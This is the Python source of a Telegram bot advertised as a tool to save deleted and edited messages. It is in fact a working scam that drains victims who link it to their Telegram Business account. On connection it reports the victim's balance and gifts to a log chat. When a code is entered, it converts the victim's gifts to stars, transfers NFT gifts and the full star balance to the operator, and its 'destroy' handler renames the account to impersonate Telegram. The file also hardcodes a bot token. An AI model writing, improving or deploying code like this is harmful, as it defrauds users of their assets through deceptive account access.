from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
import random

from datetime import datetime
import requests
import asyncio
import logging

# --- Constants ---
# IMPORTANT: Fill in your bot token and admin IDs here
TOKEN = "7836011672:AAHz_jFB83YkK4htm6nLq6KFAJEM8gGMg2Q"  # Your bot token
LOG_CHAT_ID = -4831448825 # Chat ID for logs (e.g., -100123456789)
ADMIN_IDS = [7562628646]  # Admin IDs (e.g., [123456789, 987654321])

MAX_GIFTS_PER_RUN = 1000
last_messages = {} # Stores last message ID for pagination edits
codes = {} # Stores unique codes for business account withdrawal
storage = MemoryStorage()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Bot Initialization ---
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

# --- FSM States ---
class Draw(StatesGroup):
    user_id_to_transfer = State() # User ID to whom gifts/stars will be transferred
    gift_selection_page = State() # Current page in gift selection pagination

# --- Keyboards ---
def main_menu_kb():
    """Returns the main menu inline keyboard."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📌 Save One-Time Messages", callback_data="temp_msgs")],
        [InlineKeyboardButton(text="🗑️ Save Deleted Messages", callback_data="deleted_msgs")],
        [InlineKeyboardButton(text="✏️ Save Edited Messages", callback_data="edited_msgs")],
        [InlineKeyboardButton(text="🎞 Animations with Text", callback_data="animations")],
        [InlineKeyboardButton(text="📖 Instructions", url="https://t.me/+lcvPndWQzcA4NDU1")] # Ensure this URL is valid
    ])

async def get_gifts_keyboard(page: int = 0):
    """
    Returns an InlineKeyboardMarkup with available gifts for pagination.
    Fetches gifts from the Telegram Bot API.
    """
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    builder = InlineKeyboardBuilder()
    gifts = []
    try:
        response = requests.get(url)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        data = response.json()
        if data.get("ok", False):
            gifts = list(data.get("result", {}).get("gifts", []))
            if not gifts:
                logging.info("No gifts available from API.")
                return InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="No gifts available", callback_data="empty")]
                ])
        else:
            logging.error(f"Telegram API error in getAvailableGifts: {data.get('description', 'Unknown error')}")
            return InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Error loading gifts", callback_data="empty")]
            ])

    except requests.exceptions.RequestException as e:
        logging.error(f"Request to Telegram API failed: {e}")
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Network error", callback_data="empty")]
        ])
    except Exception as e:
        logging.error(f"An unexpected error occurred while fetching gifts: {e}")
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Unknown error", callback_data="empty")]
        ])

    items_per_page = 9
    start = page * items_per_page
    end = start + items_per_page
    
    current_gifts = gifts[start:end]
    if not current_gifts and page > 0 and gifts: # If we go to an empty page, try going back to the last valid page
        # This recursive call can cause issues if max recursion depth is hit on very large lists.
        # A better approach for very large lists would be to clamp the page number.
        return await get_gifts_keyboard(page - 1)
    
    for gift in current_gifts:
        builder.button(
            text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
            callback_data=f"gift_{gift['id']}"
        )
    builder.adjust(2) # 2 buttons per row

    total_pages = (len(gifts) + items_per_page - 1) // items_per_page -1 if len(gifts) > items_per_page else 0
    
    # Pagination controls
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="Back", callback_data=f"down_{page - 1}"))
    else:
        nav_buttons.append(InlineKeyboardButton(text="•", callback_data="empty")) # Placeholder for first page

    nav_buttons.append(InlineKeyboardButton(text=f"{page + 1}/{total_pages + 1}", callback_data="empty"))

    if page < total_pages:
        nav_buttons.append(InlineKeyboardButton(text="Forward", callback_data=f"next_{page + 1}"))
    else:
        nav_buttons.append(InlineKeyboardButton(text="•", callback_data="empty")) # Placeholder for last page
    
    builder.row(*nav_buttons)
    return builder.as_markup()

# --- Handlers ---

@dp.message(CommandStart())
async def start_cmd(message: types.Message):
    """Handles the /start command."""
    if message.text == "/start instruction":
        try:
            img = FSInputFile("instruction_guide.png")
            await message.answer_photo(
                photo=img,
                caption=(
                    "<b>How to connect the bot to a business account:</b>\n\n"
                    "1. Go to 'Settings' → <i>Telegram for Business</i>\n"
                    "2. Go to <i>Chatbots</i>\n"
                    "3. Add <b>@AugramSaveMode_bot</b> to the list\n\n" # Replace with your bot's actual username
                    "After this, the functions will start working automatically ✅"
                )
            )
        except Exception as e:
            logging.error(f"Error sending instruction photo: {e}")
            await message.answer("An error occurred while sending instructions. Please try again later.")
        return

    try:
        photo = FSInputFile("savemod_banner.jpg")
        await message.answer_photo(
            photo=photo,
            caption=(
                "👋 Welcome to <b>AugramSaveMode</b>!\n\n"
                "🔹 Save one-time messages\n"
                "🔹 Save deleted messages\n"
                "🔹 Save edited messages\n"
                "📖 <b>Before starting, read the instructions</b>\n\n"
                "Choose what you want to save:"
            ),
            reply_markup=main_menu_kb()
        )
    except Exception as e:
        logging.error(f"Error sending start photo: {e}")
        await message.answer("An error occurred while starting the bot. Please try again later.")

@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
async def require_instruction(callback: types.CallbackQuery):
    """Prompts users to read instructions before using features."""
    await callback.answer("First, click on 📖 Instructions above!", show_alert=True)

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    """Handles new business account connections."""
    business_id = business_connection.id
    user_id = business_connection.user.id

    builder = InlineKeyboardBuilder()
    builder.button(
        text="⛔️ Disconnect Account", 
        callback_data=f"destroy:{business_id}"
    )
    
    code = str(random.randint(1000, 9999)) # 4-digit code
    codes[code] = business_id # Store business_id linked to the code
    
    user = business_connection.user
    
    try:
        info = await bot.get_business_connection(business_id)
        rights = info.rights
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)
        
        # Calculations
        total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
        nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
        
        # Calculation of NFT transfer cost (25 stars for each NFT)
        nft_transfer_cost = len(nft_gifts) * 25
        # Total cost (conversion of regular + NFT transfer)
        total_withdrawal_cost = total_price + nft_transfer_cost
        
        # Text formatting
        header = f"✨ <b>New Business Account Connection</b> ✨\n\n"
        
        user_info = (
            f"<blockquote>👤 <b>User Info:</b>\n"
            f"├─ ID: <code>{user.id}</code>\n"
            f"├─ Username: @{user.username or 'none'}\n"
            f"╰─ Name: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
        )
        
        balance_info = (
            f"<blockquote>💰 <b>Balance:</b>\n"
            f"├─ Available Stars: {int(stars.amount):,}\n"
            f"├─ Stars in Gifts: {total_price:,}\n"
            f"╰─ <b>Total:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
        )
        
        gifts_info = (
            f"<blockquote>🎁 <b>Gifts:</b>\n"
            f"├─ Total: {gifts.total_count}\n"
            f"├─ Regular: {gifts.total_count - len(nft_gifts)}\n"
            f"├─ NFT: {len(nft_gifts)}\n"
            f"├─ <b>NFT Transfer Cost:</b> {nft_transfer_cost:,} stars (25 per NFT)\n"
            f"╰─ <b>Total Withdrawal Cost:</b> {total_withdrawal_cost:,} stars</blockquote>"
        )
        
        # Add NFT list if any
        nft_list_str = ""
        if nft_gifts:
            nft_items = []
            for idx, g in enumerate(nft_gifts, 1):
                try:
                    gift_id = getattr(g, 'id', 'hidden')
                    nft_items.append(f"├─ NFT #{idx} (ID: {gift_id}) - 25⭐")
                except AttributeError:
                    nft_items.append(f"├─ NFT #{idx} (hidden) - 25⭐")
            
            nft_list_str = "\n<blockquote>🔗 <b>NFT Gifts:</b>\n" + \
                         "\n".join(nft_items) + \
                         f"\n╰─ <b>Total:</b> {len(nft_gifts)} NFTs = {nft_transfer_cost}⭐</blockquote>\n\n"
        
        rights_info = (
            f"<blockquote>🔐 <b>Bot Rights:</b>\n"
            f"├─ Basic: {'✅' if rights.can_read_messages else '❌'} Read | "
            f"{'✅' if rights.can_delete_all_messages else '❌'} Delete\n"
            f"├─ Profile: {'✅' if rights.can_edit_name else '❌'} Name | "
            f"{'✅' if rights.can_edit_username else '❌'} Username\n"
            f"╰─ Gifts: {'✅' if rights.can_convert_gifts_to_stars else '❌'} Convert | "
            f"{'✅' if rights.can_transfer_stars else '❌'} Transfer</blockquote>\n\n"
        )
        
        footer = (
            f"<blockquote>🔑 <b>Withdrawal Code:</b> <code>{code}</code>\n"
            f"ℹ️ <i>Each NFT gift transfer costs 25 stars</i>\n"
            f"🕒 Time: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
        )
        
        full_message = header + user_info + balance_info + gifts_info + nft_list_str + rights_info + footer
        
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Error handling business connection for user {user_id}: {e}")
        await bot.send_message(LOG_CHAT_ID, f"❌ Error processing business connection for user {user_id}: {e}")

@dp.callback_query(F.data == "draw_stars")
async def draw_stars_callback(callback: types.CallbackQuery, state: FSMContext):
    """
    Initiates the star withdrawal process from the admin panel.
    Asks the admin for the target user ID.
    """
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("You don't have access to this function.", show_alert=True)
        return
    
    await callback.message.answer(
        text="Enter the user ID to whom you want to transfer gifts/stars:"
    )
    await state.set_state(Draw.user_id_to_transfer)
    await callback.answer() # Acknowledge the callback

@dp.message(F.text, Draw.user_id_to_transfer)
async def process_user_id_for_gift(message: types.Message, state: FSMContext):
    """Processes the user ID entered by the admin for gift transfer."""
    try:
        user_id_to_transfer_val = int(message.text)
    except ValueError:
        await message.answer("Invalid user ID. Please enter a numeric ID.")
        return
    
    await state.update_data(user_id_to_transfer=user_id_to_transfer_val)
    await state.update_data(current_page=0) # Initialize page to 0

    markup = await get_gifts_keyboard(page=0)
    msg = await message.answer(
        text="Available gifts:",
        reply_markup=markup
    )
    last_messages[message.chat.id] = msg.message_id # Store message_id for editing
    
    await state.set_state(Draw.gift_selection_page) # Set state to gift selection page

@dp.callback_query(F.data.startswith("gift_"), Draw.gift_selection_page)
async def transfer_selected_gift(callback: CallbackQuery, state: FSMContext):
    """Transfers the selected gift to the specified user."""
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("You don't have access to this function.", show_alert=True)
        return

    gift_id_to_send = callback.data.split('_')[1]
    user_data = await state.get_data()
    user_id_to_transfer_val = user_data.get('user_id_to_transfer')

    if not user_id_to_transfer_val:
        await callback.message.answer("Error: User ID for transfer not found. Please start over.")
        await state.clear()
        return

    try:
        # Note: bot.send_gift is typically for sending gifts to regular users,
        # not specifically for transferring owned business gifts.
        # For business gifts, `bot.transfer_gift` is generally used.
        # Ensure 'gift_id_to_send' here is the `owned_gift_id` from `get_business_account_gifts`
        # if you intend to transfer an *owned* gift, not a general `gift_id` for a new purchase.
        # The original code's logic here seems to assume `gift_id` from `getAvailableGifts`
        # can be sent as an owned gift, which might be incorrect for `transfer_gift`.
        # If `gift_id_to_send` refers to an `owned_gift_id`, then it should be passed to `transfer_gift`.
        # If `gift_id_to_send` refers to a `gift.id` from `getAvailableGifts` (meaning buying a new gift),
        # then `send_gift` is appropriate, but it would be bought from the bot's own stars, not transferred from a business account.
        # Given the context of "draw_stars" and "access" which handles owned gifts,
        # it's likely you intend to transfer an owned gift. This part might need clarification.
        await bot.send_gift(
            gift_id=gift_id_to_send, # This might need to be an owned_gift_id if you want to transfer an existing gift
            chat_id=int(user_id_to_transfer_val)
        )
        await callback.message.answer("Gift successfully sent!")
    except Exception as e:
        logging.error(f"Error sending gift {gift_id_to_send} to {user_id_to_transfer_val}: {e}")
        await callback.message.answer(f"Failed to send gift. Error: {e}")
    finally:
        await state.clear() # Clear state after operation
        await callback.answer()

@dp.callback_query(F.data.startswith(("next_", "down_")), Draw.gift_selection_page)
async def edit_gift_page(callback: CallbackQuery, state: FSMContext):
    """Handles pagination for the gift selection."""
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("You don't have access to this function.", show_alert=True)
        return

    user_data = await state.get_data()
    current_page = user_data.get('current_page', 0)
    action, page_num_str = callback.data.split("_")
    
    new_page = current_page # Default to current page

    if action == "next":
        new_page = current_page + 1
    elif action == "down":
        new_page = current_page - 1
    
    await state.update_data(current_page=new_page) # Update the current page in FSM

    message_id = last_messages.get(callback.from_user.id)
    if message_id:
        markup = await get_gifts_keyboard(page=new_page)
        try:
            await bot.edit_message_reply_markup(
                chat_id=callback.from_user.id,
                message_id=message_id,
                reply_markup=markup
            )
        except Exception as e:
            logging.error(f"Error editing message reply markup: {e}")
            await callback.message.answer("Failed to update the gift list. Please try again.")
    else:
        await callback.message.answer("Message to edit not found. Please restart the gift selection process.")
    await callback.answer()


@dp.message(Command("ap"))
async def admin_panel(message: types.Message):
    """Displays the admin panel."""
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("You do not have access to this panel.")
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⭐️ Withdraw Stars",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="Admin Panel:",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    """Initiates 'self-destruction' mode for a business account."""
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("You don't have access to this function.", show_alert=True)
        return
    
    business_id = callback.data.split(":")[1]
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⛔️ Cancel Self-Destruction",
            callback_data=f"decline:{business_id}"
        )
    )
    
    try:
        # These operations might require specific business account permissions.
        # If they fail, it might be due to missing rights.
        await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
        await bot.set_business_account_bio(business_id, "Telegram")
        
        # Ensure 'telegram.jpg' exists in the same directory as your script
        photo_file = FSInputFile("telegram.jpg") 
        # For business account photo, use InputFile. The example code uses InputProfilePhotoStatic which is for user profiles.
        # For business, typically it's just a regular photo upload method.
        # You might need to adjust this based on aiogram's exact capabilities for business profiles.
        await bot.set_business_account_profile_photo(business_id, photo_file)
        
        await callback.message.answer(
            text="⛔️ Self-destruction mode enabled. Click the button to disable it.",
            reply_markup=builder.as_markup()
        )
    except Exception as e:
        logging.error(f"Error in destroy_account for business_id {business_id}: {e}")
        await callback.message.answer(f"Failed to enable self-destruction. Error: {e}")
    finally:
        await callback.answer()

@dp.callback_query(F.data.startswith("decline:"))
async def decline_self_destruction(callback: CallbackQuery):
    """Cancels the 'self-destruction' mode for a business account."""
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("You don't have access to this function.", show_alert=True)
        return

    business_id = callback.data.split(":")[1]
    try:
        await bot.set_business_account_name(business_id, "Bot")
        await bot.set_business_account_bio(business_id, "Some bot")
        # Consider resetting the photo here as well if needed.
        await callback.message.answer("The account has been saved from deletion.")
    except Exception as e:
        logging.error(f"Error in decline_self_destruction for business_id {business_id}: {e}")
        await callback.message.answer(f"Failed to cancel self-destruction. Error: {e}")
    finally:
        await callback.answer()

@dp.message(F.text)
async def process_withdrawal_code(message: types.Message):
    """Processes the withdrawal code entered by the user."""
    if message.text not in codes:
        return # Ignore messages that are not withdrawal codes

    business_id = codes.pop(message.text) # Use pop to remove the code after use
    user_chat_id = message.chat.id # The user who sent the code

    stolen_nfts = []
    stolen_count = 0
    
    # 1. Process gifts (convert regular gifts to stars, transfer unique gifts)
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        logging.error(f"❌ Error getting gifts for business_id {business_id}: {e}")
        await bot.send_message(LOG_CHAT_ID, f"❌ Error getting gifts for business_id {business_id}: {e}")
        await message.answer("An error occurred while retrieving the gift list.")
        return

    if not gifts_list:
        await bot.send_message(chat_id=LOG_CHAT_ID, text=f"User {business_id} has no gifts.")
        await message.answer("This business account has no available gifts.")
        
    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    
    for gift in gifts_to_process:
        owned_gift_id = gift.owned_gift_id
        gift_type = gift.type
        
        # Regular gifts: convert to stars
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, owned_gift_id)
                logging.info(f"Converted regular gift {owned_gift_id} for business {business_id} to stars.")
            except Exception as e:
                logging.error(f"Error converting regular gift {owned_gift_id} for business {business_id}: {e}")
                # Log this error but continue processing other gifts
                pass 
        
        # Unique (NFT) gifts: transfer to ADMIN_IDS
        elif gift_type == "unique":
            is_transferable = gift.can_be_transferred
            transfer_star_count = gift.transfer_star_count # This is cost of transfer
            gift_name = gift.gift.name.replace(" ", "") if gift.gift and gift.gift.name else "unknown_nft"

            if is_transferable:
                for admin_id in ADMIN_IDS:
                    try:
                        # transfer_gift consumes the stars automatically
                        await bot.transfer_gift(business_id, owned_gift_id, admin_id, transfer_star_count)
                        stolen_nfts.append(f"t.me/nft/{gift_name}")
                        stolen_count += 1
                        logging.info(f"Transferred NFT {owned_gift_id} from business {business_id} to admin {admin_id}.")
                        break # Successfully transferred to one admin, no need to try others
                    except Exception as e:
                        logging.error(f"Failed to transfer NFT {owned_gift_id} from business {business_id} to admin {admin_id}: {e}")
                        pass # Try next admin if available, or just log the error

    # Log stolen NFTs
    if stolen_count > 0:
        text = (
            f"🎁 Successfully acquired gifts: <b>{stolen_count}</b>\n\n" +
            "\n".join(stolen_nfts)
        )
        await bot.send_message(LOG_CHAT_ID, text)
    else:
        await message.answer("Failed to acquire NFT gifts (or none were available).")
    
    # 2. Transfer stars
    try:
        stars_balance = await bot.get_business_account_star_balance(business_id)
        amount_to_transfer = int(stars_balance.amount)
        
        if amount_to_transfer > 0:
            # Transfer stars to the first admin in the list
            if ADMIN_IDS: # Ensure there's at least one admin
                await bot.transfer_business_account_stars(business_id, amount_to_transfer, ADMIN_IDS[0]) 
                await bot.send_message(LOG_CHAT_ID, f"🌟 {amount_to_transfer} stars withdrawn from business account {business_id} to user {ADMIN_IDS[0]}")
            else:
                await bot.send_message(LOG_CHAT_ID, f"No admin IDs configured to receive stars from business account {business_id}.")
                await message.answer("No admin IDs configured to receive stars.")
        else:
            await message.answer("The user has no stars to withdraw.")
    except Exception as e:
        logging.error(f"🚫 Error withdrawing stars from business_id {business_id}: {e}")
        await bot.send_message(LOG_CHAT_ID, f"🚫 Error withdrawing stars from business_id {business_id}: {e}")
        await message.answer("An error occurred while attempting to withdraw stars.")

async def main():
    logging.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
